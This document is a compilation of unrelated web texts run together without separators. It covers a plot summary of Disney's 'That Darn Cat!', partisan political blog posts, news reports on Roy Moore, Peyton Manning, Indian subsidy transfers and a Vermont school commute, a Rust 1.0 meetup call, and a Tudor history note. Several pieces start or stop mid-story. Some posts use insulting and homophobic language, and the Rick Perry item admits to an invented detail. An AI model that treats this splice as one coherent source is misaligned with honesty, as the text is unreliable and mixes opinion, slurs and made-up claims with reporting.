Plot [ edit ]
"Darn Cat" or "DC" is a wily, adventurous Siamese tomcat who lives with young suburbanite sisters Ingrid "Inkie" (Dorothy Provine) and Patricia "Patti" Randall (Hayley Mills) and enjoys wandering around town and teasing a local bulldog named Blitzy.
One night, DC follows bank robber Iggy (Frank Gorshin) into an apartment where he and his partner Dan (Neville Brand) are holding bank employee Miss Margaret Miller (Grayson Hall) hostage. Miss Miller uses the opportunity to replace his collar with her watch, on which she has inscribed "HELP," and releases him to go home to the Randalls'.
Patti discovers the watch on DC and suspects that it belongs to the kidnapped woman. She goes to the FBI and tells Agent Zeke Kelso (Dean Jones) of her discovery, and Supervisor Newton (Richard Eastham) assigns Kelso to follow DC in the hope that he will lead them back to the robbers' hideout.
Kelso sets up a headquarters in the Randalls' house and assigns a team to keep the cat under surveillance, but, despite multiple attempts and a bugging system, DC eludes them in humiliating and comedic ways, culminating in a chase where he leads Agent Kelso through a several back yard and a drive-in theatre. As DC ends up trying to open a pidegon cage and is discovered by the owner Gregory Benson (Roddy McDowall) who is also Ingrid's carpool and chases DC and Kelso and out of frustration tells Ingred he quits being her carpool. The next day agent Kelso's supervisor Newton shuts down the operation, considering the evidence of the watch not hard enough, but Patti disguises herself as the hippie niece of her friend Mr. Hoffsteddar (Ed Wynn) the jeweller and persuades the FBI that the watch was indeed hard evidence. Patti and Kelso rescue Miss Miller and bring the robbers to justice.
Subplots involve a romance between Patti's sister Ingrid and Kelso as he becomes her new carpool, and a romance between Patti herself and a surf-obsessed slacker neighbor, Canoe Henderson (Tom Lowell), and the meddling of nosey neighbor Mrs. MacDougall (Elsa Lanchester) and her disapproving husband, Wilmer MacDougall (William Demarest). At the end, it is revealed that the gray cat in the opening sequence and DC are taking their kittens on a prowl, having started a family.
Cast [ edit ]
Production [ edit ]
The exterior neighborhood scenes were filmed on The Walt Disney Studios backlot in Burbank, California.
Each of the Seal Point Siamese cats who collectively play the role of DC are so-called "traditional" or "old style" Siamese, as opposed to the more dainty, long and tubular modern Siamese show cats. One of the cats used for the film belonged to longtime cat breeder Edith Williams, a member of the Stud Book Fanciers Association. One of the feline actors also starred, along with two dogs, in Disney's 1963 film The Incredible Journey.[2]
Reception [ edit ]
Bosley Crowther of The New York Times wrote, "The feline that plays the informant, as the F.B.I. puts it, is superb. Clark Gable at the peak of his performing never played a tom cat more winningly. This elegant, blue-eyed creature is a paragon of suavity and grace", and concluded, "...it's an entertaining picture. Even a king might profitably look at That Darn Cat."[3]
The film was well received by critics, earning a 94% rating on Rotten Tomatoes.
Awards and nominations [ edit ]
The film's writers, Mildred Gordon, Gordon Gordon, and Bill Walsh, were nominated by the Writers Guild of America for Best Written American Comedy. The film was also nominated for an Edgar Allan Poe Award for Best Motion Picture, and a Golden Leaf nomination for Best Supporting Actress (Elsa Lanchester). Mills won the 1966 second place Golden Leaf award for Comedy Performance, Actress. The Sherman Brothers won the third place Golden Leaf award for Best Song.

Just like when Republicans talk about “family values” and then you find out they've been having secret sex meet-ups in airport bathrooms or abusing teenage boys, when conservatives say they “support the troops,” they usually mean they're sending them overseas to fight for oil profits, but now it also means they're taxing them for their own benefits.
According to the Military Times, House Veterans Affairs Committee Chairman Phil Roe (R-Tenn.) has drafted legislation that would charge soldiers $100 a month for access to the GI Bill. The bill would deduct a total of $2,400 from each soldier's paycheck to make them eligible. To be clear, this money would not be used to offset spending, because it would only be a fraction of the total cost. Supporters of the proposal (pronounced “as soles”) say that having soldiers “buy in” would make future budget-makers less likely to cut veterans benefits, which is a lie, for two reasons:
It is really an attempt to reduce the number of veterans whose educations they have to pay for by forcing already low-paid soldiers to give up $2,400. The “people likely to cut soldiers' benefits” are the politicians who are proposing this law!
Democrats have expressed reservations about the plan, as have some veterans groups, insisting that the education benefit is earned through service, not by paying money back to the country they serve. “Pushing this GI Bill tax proposal on troops in a time of war is political cowardice,” said Paul Rieckhoff, CEO of Iraq and Afghanistan Veterans of America “Some politicians would rather make backroom deals than raise taxes or find other ways to support our troops as bombs continue to fall overseas.”
Instead of charging soldiers, there is another novel way to solve the problem, which conservatidiots might not have thought of: Simply pass a law banning cuts to veterans benefits. Voilà! Problem solved.
The GI Bill offers full tuition to a public four-year college (and the equivalent to private colleges) to active duty service members after three years of service. The benefits are also available to reservists who are called up to active duty for extended periods, and soldiers wounded while serving. This bill would apply only to new enlistees.

Because that is the hypocrisy of the Republican ethos. They will wave the flag and trumpet patriotism, but when they see the faces of the people who make up the force that protects them and provides their freedom, what they want to say is, “Thank you for your service ... but not really.”
We know Donald Trump is about as popular with minorities and women as a flamboyant gay man is in Saudi Arabia. Recently, Trump's approval numbers with married women — a usually very solid GOP voting bloc — was in the 70's….on the negative side.
Where Trump is supposedly going to make his play is with middle class working white people. There have been pro-Trump dunderheads bloviating about Trump's performance with those voters in the primary, completely ignoring or unwilling to fathom the the major difference between primary elections and general elections. How Trump did in those contests against Ted Cruz matters little in November.
From Bloomberg:
Donald Trump trails Hillary Clinton by 7 percentage points among middle-income voters in the Rust Belt, a key demographic he almost certainly needs to become president. Likely voters with annual family incomes of $30,000 to $75,000 in Michigan, Ohio, Pennsylvania, and Wisconsin back Clinton over Trump, 46 percent to 39 percent, the latest Purple Slice online poll for Bloomberg Politics shows. The findings should sound an alarm for Trump because they show he's failing—at least so far—to dominate among the sort of voters thought to be more sympathetic to him. The poll also splashes cold water on suggestions that the real-estate developer and TV personality is well positioned to win in the Rust Belt.
The one portion of the poll shows that Trump and his Little Yellow Bus strategy of attacking fellow Republican, Susana Martinez might not be such a great idea:
The poll illustrates the racial divide playing out between Clinton and Trump. When only the white middle-income participants are considered, the billionaire beats Clinton 44 percent to 40 percent. That's behind where Republican Mitt Romney finished with white voters against Obama in the last election, when exit polls showed the former Massachusetts governor winning 59 percent of the white vote.
Doing great!
It is stunning that Hillary Clinton can be so unlikable and people have such negative opinions of her and she will still likely win.
Reuters Photographer Most countries will face labor shortages by 2030, according to a new report from the Boston Consulting Group.
BCG looked at 25 major economies around the world and found that by 2020 many countries will have a surplus, while by 2030 this will turn into a "massive shortfall."
To understand what the shortfall means for the global economy, the authors of the report multiplied the labor gap figure for each country by labor productivity to get the "dollar value of GDP not created."
"In the 20-year productivity scenario, we calculated $10 trillion of lost GDP," according to the report — which is about 10% of global GDP according to 2013 figures.
Three countries in particular stand out:
Brazil's labor supply is projected to increase at 1.26% annual growth rate between 2012-2020 and 0.5% between 2020-2030. Yet. it is projected to have one of the biggest shortfalls. "Brazil will have a shortage of up to 8.5 million workers in 2020; by 2030, that figure could increase nearly fivefold to 40.9 million people."
China is slated to have a labor surplus of 55.2 - 75.3 million workers in 2020, but that "could reverse sharply, turning into a shortage of up to 24.5 million people by 2030." Between 2012-2020 housing is expected to rise at 0.05% annual growth rate, and contract 0.32% annually from 2020 to 2030.
Germany's labor supply will actually shrink from 43 million now to 37 million in 2030. It's labor supply is projected to contract at a 0.4% annually between 2012-2020 and contract 1.2% annually between 2020 and 2030.
Shortly after the allegation was made, the Senate Republicans' campaign arm said in a statement that if Moore chooses to stay in the race and wins his seat, the Senate “should vote to expel him."
Another woman on Monday came forward to accuse Alabama US Senate candidate Roy Moore of sexual misconduct, alleging that when she was 16 years old, he groped her, choked her, and forced her head near his crotch. At a news conference with her lawyer, Gloria Allred, Beverly Young Nelson said Moore offered to drive her home from her job as a server at a restaurant in Gadsden, Alabama, when the assault occurred in his car a week or two after Dec. 22, 1977. The age of consent in Alabama is 16.
She said that after her shift ended at 10 p.m. she waited outside the restaurant for her boyfriend to pick her up and drive her home. However, he was late, she said, and Moore — who frequented the restaurant — offered her a ride.
"I trusted Mr. Moore," Nelson said. "He was the district attorney. I thought he was simply doing something nice by offering to drive me home."

Instead, Moore parked his car in a "dark and deserted area" at the back of the restaurant between the wall and a dumpster, Nelson said. “I was alarmed,” she said, adding that Moore began “putting his hands on my breasts” and locked her side of the car so she couldn't get out. When she tried fighting him off, Nelson said, yelling at him to stop, Moore “began squeezing my neck attempting to force my head onto his crotch.”
Richard Drew / AP Beverly Young Nelson points to her photo in her high school yearbook.
“I thought that he was going to rape me,” Nelson said at the conference. She said that he also tried to "pull my shirt off," adding that she was terrified and had tears running down her face.
She recalled that Moore "gave up" at some point.
"He then looked at me and said, 'You are a child. I am the district attorney of Etowah County. If you tell anyone about this, no one will believe you,'" Nelson said. He then allowed her to open the car door and she "either fell out or he pushed me out," Nelson said. The next day, “my neck was black and blue and purple,” Nelson said, adding she “covered the bruising on my neck with makeup. I did not tell anyone what had happened, I was scared.” Nelson said that she felt Moore would "do something to me or my family," if she told anyone what had happened.
The day after the alleged assault, Nelson quit her job at the restaurant and never returned. She said she told her younger sister about the incident two years later, and her mother four years ago. She also told her husband about the alleged assault before she married him. Nelson said she and her husband supported Donald Trump in the election and that this has "nothing to do" with politics. "It has everything to do with Mr. Moore's sexual assault when I was a teenager," Nelson said.
"I thought I was Mr. Moore's only victim," she said. "He no longer has any power over me and I no longer live in fear of him."

In a statement, Moore's campaign chairman, Bill Armistead, called Allred a "sensationalist leading a witch hunt."
"We've said this before and we'll say it again: Judge Moore is an innocent man and has never had any sexual misconduct with anyone," the statement said. "This is a witch hunt against a man who has had an impeccable career for over 30 years and has always been known as a man of high character."
Armistead said that the campaign will "pursue all legal options against these false claims." Moore also personally denied the latest allegations in a brief press conference Monday night. "I can tell you without hesitation this is absolutely false," he said. "I never did what she said I did. I don't even know the woman. I don't know anything about her. I don't even know where the restaurant is or was." Moore's wife of 32 years, Kayla, also spoke, dismissing the allegations as ugly politics. She defended her husband's character and commitment to God. "He has never one time lifted a finger to me," she said. "He is the most gentle, kind man I have known in my life." Nelson is not considering civil or criminal actions against Moore, Allred said. Moore's representatives didn't return a request for comment. Moore has denied similar allegations made by four other women featured in a Washington Post article on Nov. 9. Nelson, who began working at the restaurant when she was 15, said Moore was a regular customer there and would complement her and "pull the ends of my long hair." She said that while she was accustomed to men flirting with her, she did "nothing to encourage [Moore's] flirtatious behavior" and was not interested in dating a man "twice my age."
On Dec. 22, 1977, a week or two before the alleged assault, Moore wrote in Nelson's yearbook: "To a sweeter more beautiful girl I could not say 'Merry Christmas.' Christmas 1977. Love, Roy Moore, D.A." Moore was the local district attorney at the time.
Here's the photo of Nelson's yearbook that Roy Moore signed calling her "a sweeter, more beautiful girl"
Allred urged the Senate Judiciary Committee to hold a public hearing and subpoena Moore to testify about the allegations against him.
Shortly after the news conference, Republicans escalated their opposition to Moore. Colorado Sen. Cory Gardner, who runs the Senate Republicans' campaign arm, said in a statement that if Moore chooses to stay in the race and wins his seat, the Senate “should vote to expel him, because he does not meet the ethical and moral requirements of the United States Senate.”
Under the Constitution, the Senate is able to “punish its members for disorderly behavior, and, with the concurrence of two-thirds, expel a member.” Fifteen senators have been expelled since 1789, including 14 during the Civil War.
Senate Majority Leader Mitch McConnell also said he now believes the women who accused Moore of sexual misconduct while they were teenagers — and that Moore should "step aside" in the race.
McConnell, the most powerful member of the US Senate, said last week Moore should step aside "if" the allegations from the women — one, Leigh Corfman, was 14 at the time — were true. He's now changed his position. Three other women told the Washington Post that Moore “pursued them” while he was in his early thirties — they say they were between 16 and 18. Those three women didn't allege sexual contact. Moore has also denied those allegations.
There are also signs that say the path is open only from 7 a.m. to 7 p.m.
Porta-Pottys donated by A1 Sewer and Drain have been placed at each end of the forest trail. Volunteers sit under tent canopies supplied by Celebration Rentals, giving out sandwiches, beverages, doughnuts, gummy bears and red licorice. Six golf carts from Green Mountain National Golf Course transport the elderly and infirm. All-terrain vehicles from Central Vermont Motorcycles and the Hendy Brothers John Deere dealership are used for safety patrols.
John King, owner of the Gramps Shuttle, has volunteered his vans to take the students up and down the mountain, along with adults who don't have rides from the end of the paths.
Last week a Gramps van picked up seven people at Rutland Airport who needed to make connections at Logan Airport in Boston . “We told them we could do it, but they'd have a short walk,” he said. “We didn't tell them where they'd be walking until they got here.”
A Gramps van dropped them off at one end of the path. Their luggage was loaded onto all-terrain vehicles. Then they trooped through the woods to another Gramps van, which drove them to Boston. “Made it in three and a half hours,” Mr. King said.
The roads are still so bad that the final three students who live farthest away didn't make it to school until last Wednesday. Town officials hope to have the roads passable in the next few weeks, before the first snow, but until then the children are walking through the woods.

It's not a simple commute. Crawford Jones's mother drives him from Mendon to a pickup area on Route 4, where the Gramps Shuttle van meets him and takes him down to the start of the path. There, a parent volunteer walks him and the others through the woods. A small school bus that can turn around in a tight space picks up the children and takes them to Sherwood Drive, where the big bus is waiting to take them to school.
One day after school last week, the bus arrived at the forest path and the students made a beeline to the refreshment tent. There were fruits and peanuts, but most favored the doughnuts, gummy bears and licorice. By the time they headed into the woods, sugar was oozing from their pores. Michelle Ericksen, a school board member who was accompanying them, caught Riley Bates, a second grader whose favorite classes are gym and recess, with an entire bag of gummy bears and confiscated them before he could rocket to the moon.
It was raining and muddy. Several of the girls, including Charlotte Tyler, a kindergartner, wore pretty boots, but not Riley, who said all he needed was sneakers. “If you walk around the house, the mud just wears off,” he said.

Along the way, they passed Darren Snitker, a contractor who has coordinated donations from the local businesspeople. He was spreading 12 truckloads of pine bark mulch along the trail, which made it less slippery but also explained why this wooded path smelled like the garden department at Home Depot .
Whatever children are doing seems normal to them, and for most, hiking through the woods has become routine. Asked how she does it, Charlotte, the kindergartner, said, “I just walk straight ahead.”
Ms. Prescott, the principal, believes their adventure stands for something a little more. Last week, when all 33 had finally made it to school, she held a special assembly to officially welcome them for the new year. As assemblies go, there wasn't a lot of dazzle, no special effects, not one PowerPoint. She simply stood in the middle of the gym, and one by one called them down from the bleachers to be recognized for making it to school under difficult circumstances.
“Charlotte Tyler,” she called out. “Ben Tyler. Mollie Porcaro. Gage Porcaro.” When they heard their names, they bounded down from the bleachers and formed a line on the gym floor facing their classmates, who cheered them and let out loud, high-pitched “woo-woo”s.
After Ms. Prescott was done with the children, she called down teachers who'd overcome sizable odds, including Bob Myers, the middle school social studies teacher. Mr. Myers left his house at 4 a.m. and managed to get to school the first day by 8:07, even though his GPS said “Recalculating” so many times he finally turned it off and guessed the best way.
That afternoon, Ms. Prescott gave out no trophies, plaques or certificates of appreciation. When asked why she'd held an assembly, she said, “It makes people feel good.” And it was true — as they headed back to class, they did look a little puffed up.
Earlier this week actor-filmmaker Ben Affleck seemed to confirm on TV that he will indeed direct The Batman this year. Now he's back to hedging, but this time explaining a very specific concern he needs dealt with before he steps on set.
"I know what it is like to be in the suit," Affleck told USA Today. "We'll have to modify the suit to make it a little bit easier to put on and take off. When you are in it, you can be sweating, crazy and exhausted, do your part and walk away. But when you're a director, you can't walk away. You have to be there for everybody. Chief among the challenges of doing Batman, will be finding a suit that's more comfortable."
Affleck also said, "Superhero movies get the level of attention that is nothing like any film I've done. You cast the 14th lead in these movies and the Internet goes crazy. ... I understand and embrace that. That's part of the pressure that comes with doing it. That's why I am not going to do it, unless I really feel confident about it."
"But when that day comes, should that day come, I'm sure that's going to be the most pressure, the most stress I have ever experienced in my professional life. ... There's no doubt."
The Batman was reportedly expected to begin filming this spring, although Batman-on-Film recently claimed the production was being delayed until later in the summer, which would mean a summer 2018 release date was no longer viable. We inquired with Warner Bros. about the rumor, but they still hadn't responded by time of publish.
I just got this tweet from Benjamin Netanyahu's Twitter account:
שוב נחשף אופיו האמיתי של המחנה האנטי-ציוני בראשות בוז'י וציפי. כאשר ח”כ עתידי ברשימת “העבודה” משבח סוכן של חיזבאללה – מה יש עוד להוסיף?
It says: “Again, the true face of the ‘anti-Zionist' camp headed by Buji (Herzog) and Tzipi (Livni) is revealed. When a future member of the Knesset from the Labor list praises a Hezbollah agent, what more is there to say?”
I submit, these are the ravings of a lunatic mind.
Bibi is referring to testimony given by Zuhair Bahloul, a Palestinian citizen of Israel who is #17 on the joint Labor/Ha'Tnuah list, dubbed “The Zionist Camp.” Bahloul is a well-known figure in Israel, a soccer and basketball broadcaster for Israel's Channel 1. He is also known for his efforts in bringing Jewish and Arab citizens of Israel together to promote co-existence and equality, which has generally been the sum total of his political activity.
In this case, Bahloul was testifying on behalf of the family of a man who was convicted of aiding a Hezbollah plot to attack Shimon Peres in Turkey. The man, Milad Khatib, accepted a plea bargain and is serving a seven-year sentence. Bahloul's testimony was offered in defense of Khatib's family, not Milad himself. (It's worth noting that such scrutiny is not generally focused on families of Jewish radicals, even the ones sometimes labelled “terrorists” after so-called “price tag” attacks).
In fact, Bahloul went out of his way to differentiate between Milad and the rest of his family: “When I heard what this young man did I was shocked,” he said, and he stressed that whatever made Milad “fall off the right path, it was not the family that brought him to this. It is not at all typical of this family.”
Today, he clarified further:“I know the Khatib family well and their efforts for coexistence between Jews and Arabs. I am completely opposed to the kind of actions taken by (Milad) Khatib. I find attempts to harm the good relations between Jews and Arabs on the basis of the acts of individuals to be disgusting, and I will fight it with all my power.”
This, my friends, is the man Netanyahu is pillorying as a defender of Hezbollah. It does, in my opinion, show how tragically warped Netanyahu's thinking is and just how much he is relying on stirring up more hatred of Arabs to win his bid for re-election. This is hate-preaching demagoguery, nothing less. It should not be tolerated by anyone, much less by anyone who cares about Israel, whether they are Israeli or not, right-wing or left-wing.
Bibi has been harping on the absurd notion that the “Zionist Camp” is a radical left, even anti-Zionist ticket. Yes, that's right, the coalition that is mostly made up of the party that was the very definition of Zionism from the days of the Second Aliyah to the end of the twentieth century, and which joined with the party led by a woman whose family has long been considered Likud royalty is, actually, anti-Zionist.
These words are completely disconnected from reality, but they are important for us to note. Bibi's attack on a well-known public figure — an Israeli citizen who has worked for Arab-Jewish harmony and who is only defending a family whom he knows to want only peaceful co-existence from being punished for crimes they did not commit and are firmly opposed to — makes the racism at the heart of the Likud absolutely clear. It demonstrates the disdain for basic principles of democracy and civil rights that dominates the heart of the modern Israeli right wing.
And, lest we forget, Netanyahu actually represents the moderate wing of Likud these days. Indeed, Likud itself is more moderate on such matters than rising powerhouse, HaBayit HaYehudi (Jewish Home). That, my friends, is where the Israeli right is leading Israel. Not only Israelis, but every Jew and every person who stands against racism has a strong stake in stopping them.

Hey there, kind Rusticians.
The big day is almost here. Rust 1.0 is going to be released on 5/15, and that's a tremendous accomplishment for our amazing worldwide community. So what better time to have a worldwide party? If you organize Rust meetups, consider scheduling one for launch day!
We'll be distributing a new Rust t-shirt at these meetups. The supply will not be enough to fill demand so event organizers will have to decide how to distribute them equitably. SF for example may do a raffle, or otherwise hold some contest. Due to the logistics of shipping stuff we need to coordinate. If you are hosting a launch meetup please contact me to confirm and provide 1) a shipping address, 2) typical attendance, 3) special requests about sizes, etc. You may either post here or email me at banderson@mozilla.com. I need this information next week.
Oh, and don't fret if you don't get one of the shirts: we'll make them available for purchase online for those who don't get one at a meetup.
I already have confirmations from SF, London and Toronto and have heard from a few more groups that have been contacted privately. As more events are confirmed I will provide updates and links to registration.
Let's make this an unforgettable 1.0!
. On this day in history in the reign of Queen Mary I, 12th February 1554, Lady Jane Grey and her husband, Lord Guildford Dudley, were executed for treason: Guildford on Tower Hill and Jane at the Tower of London.
Jane and Guildford had been found guilty of treason, along with Guildford's brothers Ambrose and Henry, and Archbishop Thomas Cranmer, at a public trial at London's Guildhall on 13th November 1553. The men were sentenced to be hanged, drawn and quartered, and Jane was sentenced to be burned alive or beheaded. Ambrose and Henry Dudley escaped death, but Cranmer was burned at the stake for heresy in March 1556 and Guildford and Jane were executed shortly after Wyatt's Rebellion, a rebellion which Jane's father, Henry, Duke of Suffolk, was involved in.
Lady Jane Grey was only around sixteen years of age when she was executed and Guildford was a similar age, or perhaps a bit older. They both died with dignity and in the reformed faith. They were buried in the Chapel of St Peter ad Vincula at the Tower of London.
You can read more about their executions in my article Remembering Lady Jane Grey and Guildford Dudley and you can read a primary source account of their executions in The Executions of Lady Jane Grey and Lord Guildford Dudley: A Primary Source Account. I've also written an article Gillyflowers for Lord Guildford Dudley
If you're interested in reading more about Jane and Guildford's relationship then I'd recommend ‘Loving of my Husband': Jane and Guildford Dudley, an article by Christine Hartweg.
Today is also the anniversary of the death of Blanche Parry, Chief Gentlewoman of the Privy Chamber of Elizabeth I, at the age of 82. Click here to read more about her.

Capitalism to fight Capitalism?
Need your holiday dose of ‘bashing the fash?' Wal-Mart may just have the thing for you! Just in time for Christmas, their online store has some new ‘merch' up that will match those combat boots while you're smashing the windows of your local Bank of America.
It was discovered today that Wal-Mart is now selling a large variety of of Antifa shirts. One of the even has the slogan “Together Antifa.”
Walmart is one of the largest corporations, and essentially the epitome of capitalism. It is a company likely looked at by anarcho-communists, like Antifa as the worst evil and for it to be selling shirts that are against capitalism for capital gain, is quite hilarious.
Not to mention selling merchandise that supports a group which has been deemed a domestic terror group in at least one of the fifty states, is probably not the best business plan. They're even selling the Antifa handbook!
Does Wal-Mart truly support a group that has been the cause of several million dollars of property damage and severe injuries?
The compilation below, showing clips of Antifa violence from the last 18 months from all over the world, including several attempted murders, may change their minds…
One way to make sure that there is no evidence of a breath machine's inaccuracy and unreliability is to simply make sure there is no record of its false results and failures…even if it means innocent people are convicted. The main thing is to maintain faith in these devices, right?
Fudged Breathalyzer Tests Questions DUI Arrests
Inspector Turned Machines Off When They Appeared About To Fail Throwing Into Doubt Thousands Of Drunk Driving Citations
Miami, FL. Oct. 16 – Defense attorneys were in a Miami courtroom on Thursday seeking a judge's order to inspect the hard drives of every breathalyzer machine used in Miami-Dade county.
Before Judge Jose L. Fernandez, attorney Michael Catalano said, "We're interested to find why she was unplugging breath machines so that she could cover up mistakes and not tell anybody."
This comes after the Florida Department of Law Enforcement fired the examiner who was responsible for testing all the DUI machines, alleging she failed to follow protocol with the inspections.
Defense attorneys contend it is a scandal that puts suspicion over thousands of DUI cases in Monroe, Broward and Miami-Dade.
"The number of cases involved could be as many as 10,000 here in Miami-Dade County," attorney Richard Hersch explained to CBS4 reporter Gary Nelson. "The inspector who has been discharged here was on duty for about 18 months before she was discharged."
In a "notice of dismissal", the FDLE accuses analyst Sandra Veiga of having encouraged police agencies to abort tests on Intoxilyzer 8000 machines that were giving questionable results.
"What the inspector was doing," Hersch said, "was unplugging the machine if the inspection was failing, then plugging it back in; that prevented the machines from reporting the malfunctions to Tallahassee."
Do you really think this only happens in Miami?
NEW DELHI: The central government is targeting to disburse Rs 1 lakh crore through direct benefit transfer DBT ) in the current financial year, even as total pay-outs under the scheme since its launch is set to touch Rs 2 lakh crore this month-end when the government is celebrating its third anniversary.This is DBT Version 2.0, senior government officials, who spoke to ET on the condition of anonymity, said about the programme to transfer subsidies directly to the beneficiary's bank account "While Rs 1 lakh crore payment under DBT schemes involving cash pay-out is expected in 2017-18, two major inkind subsidies — public distribution system in 34 states and UTs and kerosene subsidy — are also being brought under the DBT,” said one of them.According to him, 30% of PDS shops have already been DBT-Aadhaar enabled. "Factoring in all in-kind pay-out component schemes, DBT could be covering nearly Rs 3.5 lakh crore of the government's subsidy budget by the end of March, 2018.”Senior cabinet secretariat officials are working on a reporting mechanism to bring entire subsidies under DBT, which has helped eliminate duplicate beneficiaries and plug leakage of funds allocated for welfare programmes. Bringing in PDS and kerosene subsidy under it is expected help further swell the government's subsidy savings that totalled Rs 49,560 crore as of January 31, 2017. An updated figure on the savings may feature in the government's third anniversary booklets.Though started as a pilot by the UPA government in 2013, the DBT mission has essentially come into its own under the Modi government. While Rs 7,367 crore was transferred under DBT to 10.71 crore beneficiaries in 2013-14 in the UPA tenure, Rs 74,502 crore was transferred to 33.33 crore beneficiaries in 2016-17. The cumulative DBT pay-out, as on date, stands at about Rs 1.94 lakh crore.The government has been quickly adding more schemes under DBT — the number has increased to 220 as of now from 134 in 2016-17. "The target is to cover 534 schemes, including about 300 cash schemes, over 200 in-kind schemes as well as over a dozen services under DBT, by March 2018. This is expected to make DBT pay-out under cash schemes rise to Rs 1 lakh crore,” an official said.Nearly two-thirds of all DBT payouts curerntly are under two schemes: the rural employment guarantee programme and LPG subsidy. The National Social Assistance Programme and scholarship schemes account for most of the remaining pay-outs.Nearly 80% of DBT beneficiaries have linked their bank accounts to Aadhaar, even though there has been criticism of making Aadhaar mandatory for a plethora of DBT-enabled schemes. The requirement has been challenged before the Supreme Court.
Peyton Manning has been medically cleared by two doctors -- one of whom performed the most recent surgery on the Colts quarterback's neck -- to resume his NFL career, sources told ESPN's Chris Mortensen and Adam Schefter.
On Indianapolis' front, the good news was tempered by Colts owner Jim Irsay, who tweeted that "Peyton has not passed our physical nor has he been cleared to play for The Indianapolis Colts."
The sources said Dr. Robert Watkins, who performed the procedure on Manning, examined the player recently in Los Angeles and concluded the stability in his neck would have allowed Manning to play this Sunday as long as the nerves in his arm had regenerated to a satisfactory performance level.
Watkins also instructed the quarterback to continue an aggressive rehabilitation path that provides an optimistic outlook for Manning to play in 2012. Watkins performed Manning's spinal fusion Sept. 8, and on Dec. 1 declared that the fusion had achieved "firm fixation."
Watkins, according to the sources, joined Colts neurosurgeon Dr. Hank Feuer in clearing Manning to play. One source said that Feuer recently told Manning, "If you were my own son, I'd tell [you] to go play."
A spokesman for Watkins said in a one-paragraph email sent later Thursday night that the Colts' star was cleared to play.
"Peyton Manning underwent a thorough medical re-evaluation as part of a postoperative visit with his surgeon," Watkins' statement read. "As a result of this examination, Manning is medically cleared to play professional football."
Irsay said a team statement would be forthcoming later Friday.
Commissioner Roger Goodell, speaking Friday during his annual pre-Super Bowl news conference, said he's "not troubled at all" by all of the Manning talk during Super Bowl week, and doesn't believe it has been a distraction.
Goodell said he understands why there's so much interest in Manning, given that he's such an important player to the league and the community.
In addition to Manning's optimistic words expressed in an interview Tuesday with ESPN -- in which he indicated he plans to resume his playing career -- the medical clearance by his two doctors, the sources said, will bolster his determination to play in 2012.
What remains in question is the timeline in which Manning's nerve regeneration to his triceps will improve to the point where he is throwing passes in the manner that helped him win four MVP awards during his 13-year career.
According to one source familiar with Manning's medical review, "It's not a safety issue; it's a performance issue." This source added that Manning is "making progress."
The source said Manning had a throwing session Tuesday with two of his Colts receivers -- Anthony Gonzalez and Blair White -- at an undisclosed location and that Manning has spent numerous recent days throwing to at least one wide receiver, aiming to regain as much strength as possible in his arm.
Peyton Manning was cleared to resume his career Thursday, according to sources. Joe Robbins/Getty Images
However, the source said Manning still cannot pinpoint a date when his performance will reach an acceptable level to him. The source alluded that it might take to the one-year anniversary of Manning's May 23, 2011, surgery on a bulging disk in his neck.
Manning and Colts owner Jim Irsay have both said they expect to sit down after the Super Bowl to discuss his future with the team as a March 8 deadline nears in which Manning is due a $28 million option bonus that will trigger the final four years of a five-year, $90 million contract he signed before the 2011 season. The quarterback already received $26 million as part of that deal.
Manning has expressed a desire to settle his future with the Colts "sooner than later." There is widespread belief around the league that Irsay will not exercise the $28 million bonus. Irsay was not available for comment.
Yet should the Colts opt not to exercise the option, they would be forced to release Manning, who would immediately become a free agent. And so, while the NFL's free-agent signing period is set to begin with the commencement of a new league year March 13, Manning could be a free agent as early as next week.
If Manning becomes an unrestricted free agent, several teams are expected to bid for him, including the Washington Redskins, Miami Dolphins, Arizona Cardinals and possibly the New York Jets, among others.
Teams such as Arizona already have debated the merits of pursuing Manning behind closed doors. Some people within the Cardinals organization believe Manning could do for Arizona what Kurt Warner once did, propelling the team into an instant playoff contender.
Manning likely would be willing to sign a contract that would tie bonuses and salary to his roster status for 2012, and sources say that he will heavily factor in a team's ability to have a roster capable of competing for a playoff spot and, consequently, a Super Bowl title.
Trading Manning no longer is an option. Irsay has said he will not trade Manning -- which means he would have to pick up the $28 million bonus to retain the quarterback's rights -- and he also will not trade the No. 1 pick in the April draft, when the Colts are expected to select Stanford quarterback Andrew Luck or possibly Baylor quarterback Robert Griffin III. Many NFL executives expect Luck to be the pick.
Proving our suspicions that the citizens of Russia are over there just laughing their asses off at us idiot Americans and our dipshit government, The Guardian reports that wholly unqualified Secretary of Energy Rick Perry was tricked into sitting for 22 minutes on a prank call about pig manure by a comedy duo the paper describes as “The Jerky Boys of Russia.” Calling TV hosts Vladimir “Vovan” Kuznetsov and Alexei “Lexus” Stolyarov “The Ali G of Russia” might be more accurate, though, as the duo specializes in making fools out of celebrities and high-ranking officials. (These are the same guys who fooled Elton John into thinking he was on a call with Vladimir Putin back in 2015.)
This time around, the duo pretended to be Ukrainian Prime Minister Volodymyr Groysman and an interpreter, hoping to talk to Perry about energy policy. Perry's office scheduled a followup, no questions asked, as Perry presumably sat up straight, smoothed back his hair, and gave his staff a thumbs up in anticipation of his big-boy business call. The ostensible purpose of the call was to discuss the Republican catnip that is American coal exports, but Perry also discussed a potential oil pipeline and natural-gas exploration in Ukraine and America's withdrawal from the Paris Climate Accord, according to The Washington Post.

That's embarrassing enough, but that wasn't the real reason Kuznetsov and Stolyarov called: They wanted to tell Perry that Ukrainian President Petro Poroshenko had developed a revolutionary new biofuel composed of home-brewed alcohol and porcine manure, a.k.a. moonshine and pig shit, as translated by Pravda Report. Perry's response? That he'd like to know more about this “interesting” “scientific development,” and that he had never had Prince Albert in a can, but he looked forward to trying this Ukrainian delicacy on his next official visit. We made up that last part, but you can listen to Perry say the first part on the real prank call, which was posted in full on the Russian news site Vesti, below.

WASHINGTON (Reuters) - The U.S. Treasury said on Thursday the federal government posted a $90 billion budget deficit for June versus a year-earlier surplus of $6 billion as receipts failed to keep pace with growth in outlays.
The June deficit exceeded analysts' estimates of a $35 billion deficit.
Treasury said outlays for military pay, veterans benefits and certain other payments were accelerated into June because July 1 was on a non-business day. Without these changes, the June deficit would have been $51 billion, it said.
Receipts for June grew 3 percent to $339 billion, while outlays, including the accelerated payments, grew 33 percent to $429 billion. Outlay growth would have been 20 percent without the accelerated payments.
U.S. Treasury Secretary Steven Mnuchin has called on Congress to raise the U.S. debt limit as soon as possible to ensure that the government can meet its spending obligations.
NEW YORK (Reuters) - A Texas man accused of operating a Ponzi scheme involving bitcoins pleaded guilty on Monday in what prosecutors say was the first U.S. criminal securities fraud case related to the digital currency.

